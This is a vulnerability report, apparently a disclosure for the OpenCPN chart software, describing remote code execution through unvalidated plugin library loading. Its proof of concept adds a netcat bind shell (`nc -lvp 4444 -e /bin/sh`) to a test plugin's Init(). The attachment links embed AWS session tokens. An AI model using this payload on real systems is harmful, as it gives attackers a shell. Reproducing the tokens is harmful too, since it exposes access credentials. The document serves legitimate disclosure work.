---
notion_url: https://www.notion.so/76ebe08098308313956a81d9af926c10
last_synced: 2026-06-12 05:51
tags: [notion-sync]
---

# Code Injection

- 📄 [[KOR OpenCPN RCE - Code Injection/KOR OpenCPN RCE - Code Injection|KOR OpenCPN RCE - Code Injection]]

Vulnerability Title : OpenCPN RCE - Code Injection
Vulnerability Summary : Remote Code Execution arising from loading dynamically linked library files without signature, path, or whitelist validation
Vendor : GitHub OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Code Injection
Impact : Remote Code Execution with process privileges
Vulnerable Source File: `plugin_loader.cpp
`
Vulnerable Function: `PluginLoader::LoadPlugIn()`
Vulnerable Parameters : 

```c++
const wxString& plugin_file, PlugInContainer* pic
```

Affected Environment : Ubuntu 24.04

Proof Of Concept  : 
During the library load process, only blacklist-based validation is performed:

```c++
// Check if blacklisted, exit if so.
  auto sts =
      m_blacklist->get_status(pic->m_common_name.ToStdString(),
                              pic->m_version_major, pic->m_version_minor);
  if (sts != plug_status::unblocked) {
    wxLogDebug("Refusing to load blacklisted plugin: %s",
               pic->m_common_name.ToStdString().c_str());
    return nullptr;
  }
  auto data = m_blacklist->get_library_data(plugin_file.ToStdString());
  if (!data.name.empty()) {
    wxLogDebug("Refusing to load blacklisted library: %s",
               plugin_file.ToStdString().c_str());
    return nullptr;
  }
  pic->m_plugin_file = plugin_file;
  pic->m_status =
      PluginStatus::Unmanaged;  // Status is updated later, if necessary

  // load the library
  if (pic->m_library.IsLoaded()) pic->m_library.Unload();
  pic->m_library.Load(plugin_file);

  if (!pic->m_library.IsLoaded()) {
    //  Look in the Blacklist, try to match a filename, to give some kind of
    //  message extract the probable plugin name
    wxFileName fn(plugin_file);
    std::string name = fn.GetName().ToStdString();
    auto found = m_blacklist->get_library_data(name);
    if (m_blacklist->mark_unloadable(plugin_file.ToStdString())) {
      wxLogMessage("Ignoring blacklisted plugin %s", name.c_str());
      if (!found.name.empty()) {
        SemanticVersion v(found.major, found.minor);
        LoadError le(LoadError::Type::Unloadable, name, v);
        load_errors.push_back(le);
      } else {
        LoadError le(LoadError::Type::Unloadable, plugin_file.ToStdString());
        load_errors.push_back(le);
      }
    }
    wxLogMessage(wxString("   PluginLoader: Cannot load library: ") +
                 plugin_file);
    return nullptr;
  }
```

Using the OpenCPN TestPlugin template from GitHub for an example RCE via a bind shell:
https://github.com/jongough/testplugin_pi.git

Add the following at the very top of `src/testplugin_pi.cpp`’s `Init()`:

```c++
#include <thread>
#include <chrono>
#include <cstdlib>
+#include <fstream>

int testplugin_pi::Init(void)
{
+    // Init() 호출 확인 로그
+    std::ofstream fs("/home/user/poc_init.log");
+    fs << "Init() 호출됨\n";
+    fs.close();
+
    // … 기존 초기화 로직 …

+    // 5초 후 바인드 셸 실행 (PoC 예시)
+    std::thread([](){
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        system("/usr/bin/nc.traditional -lvp 4444 -e /bin/sh &");
+    }).detach();


```

After building and importing this plugin into OpenCPN:

![image](_assets/image.png)


You can connect to the shell via `nc`, demonstrating Remote Code Execution.

Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC2.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/92bdd4ae-35e4-4636-a8a3-fce96cfbfd0f/POC2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665CCOPNWZ%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T205110Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJIMEYCIQDExMYdMU6MEzVAVJuFjzSqhGqGJz052vPy2preXqni7wIhAMEENWa2urK%2Fj%2BQvo%2F4f%2FyEC3iqMia7t65pNyFo5WcAWKv8DCAUQABoMNjM3NDIzMTgzODA1IgwUWv%2B5sYEsXfTdI5sq3ANQjedVo3KAPvKfutmGMQagLpVzp8C68yxonS7S%2BCh0BS1OenevR4mlPT2lTc3GZfkGZefn3vbSxSat3f0tW4p1hpayHmVLRjtT2QZmaTkoZ95tl0%2FxT%2By4NtdtjgywckyAMgonv3Kj266fQ1Ibtr2FRDnKw%2BY%2FS%2Fs4zjTCQwLXTFK71yfH784%2FfMiatWJ0NKDBS%2F7OT8ukh51RfRtjCHDC77cu%2BmpPEFBW%2FzcFogIE5MLdtml1A%2FYE8RVHmaZIUWJb6dVHULNFePCGJlvDRrpStxRWSQeg8jEHdAqW5k9GGipMNVC2544YEfhOQmPDnKouYP8G8nhJySmYlPbOdHDxSMtvY0y5x%2B7FOHWSKBajlzAGWB4UMpP8q%2F765zAJ4Kr%2B6RB7xTbpTpwfyYXn06hdgqmLydywFbWG0XE3vzHQT8kQWf7KM9J2rI7jbhGZfdF%2F6RXJaXASNHzqLW6TlajSyYM0mPUwMPsbJQH8tNt2ZmQeo0GW7YdZ4ak2cZMDFTC2GChX6qFmqU8j5ZTpeFbcBc4AlNHKPkgipEhuMIflzgH0ymsCJbqn8wpKT%2Fb%2B4n1BI0ZGyqRyOkvHhiY51t2u2%2F8O3MXqu4TPFDUrSf33cHmM90GoaEQvEyWVNjD%2BqazRBjqkAUWr8ibOOolBuTmtZJg2M7SsbN0GAT8lJAUfF15sZMiae%2BNBI9%2FA7g%2BY1OqQzNw8fLbm82n7w2C8IvHvtm17fHoIRCFNVlchWdlORCeis8Qff0jum%2FoDONeMdZQSXsFDydqtJc14qC5DC6004SOT4HfDTtBKV3%2FaJrLlKeECTm5bc9qgUOqQILO9YfUaN1eqwTSE0ivV9PJqUSXJvbv8bmpmILJk&X-Amz-Signature=e9969682e5e299705e66a7ab6aabc9199c65139eee81f8d8db4a3cdfc04c9ff2&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report2.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/6af31ca2-0d32-4cb4-8668-82a7bd93bf73/zdi_report2.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665CCOPNWZ%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T205110Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJIMEYCIQDExMYdMU6MEzVAVJuFjzSqhGqGJz052vPy2preXqni7wIhAMEENWa2urK%2Fj%2BQvo%2F4f%2FyEC3iqMia7t65pNyFo5WcAWKv8DCAUQABoMNjM3NDIzMTgzODA1IgwUWv%2B5sYEsXfTdI5sq3ANQjedVo3KAPvKfutmGMQagLpVzp8C68yxonS7S%2BCh0BS1OenevR4mlPT2lTc3GZfkGZefn3vbSxSat3f0tW4p1hpayHmVLRjtT2QZmaTkoZ95tl0%2FxT%2By4NtdtjgywckyAMgonv3Kj266fQ1Ibtr2FRDnKw%2BY%2FS%2Fs4zjTCQwLXTFK71yfH784%2FfMiatWJ0NKDBS%2F7OT8ukh51RfRtjCHDC77cu%2BmpPEFBW%2FzcFogIE5MLdtml1A%2FYE8RVHmaZIUWJb6dVHULNFePCGJlvDRrpStxRWSQeg8jEHdAqW5k9GGipMNVC2544YEfhOQmPDnKouYP8G8nhJySmYlPbOdHDxSMtvY0y5x%2B7FOHWSKBajlzAGWB4UMpP8q%2F765zAJ4Kr%2B6RB7xTbpTpwfyYXn06hdgqmLydywFbWG0XE3vzHQT8kQWf7KM9J2rI7jbhGZfdF%2F6RXJaXASNHzqLW6TlajSyYM0mPUwMPsbJQH8tNt2ZmQeo0GW7YdZ4ak2cZMDFTC2GChX6qFmqU8j5ZTpeFbcBc4AlNHKPkgipEhuMIflzgH0ymsCJbqn8wpKT%2Fb%2B4n1BI0ZGyqRyOkvHhiY51t2u2%2F8O3MXqu4TPFDUrSf33cHmM90GoaEQvEyWVNjD%2BqazRBjqkAUWr8ibOOolBuTmtZJg2M7SsbN0GAT8lJAUfF15sZMiae%2BNBI9%2FA7g%2BY1OqQzNw8fLbm82n7w2C8IvHvtm17fHoIRCFNVlchWdlORCeis8Qff0jum%2FoDONeMdZQSXsFDydqtJc14qC5DC6004SOT4HfDTtBKV3%2FaJrLlKeECTm5bc9qgUOqQILO9YfUaN1eqwTSE0ivV9PJqUSXJvbv8bmpmILJk&X-Amz-Signature=d87a54a45d16ddf28374c2ac7d6867134b06a8d1c775608e32539b5c50089e08&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
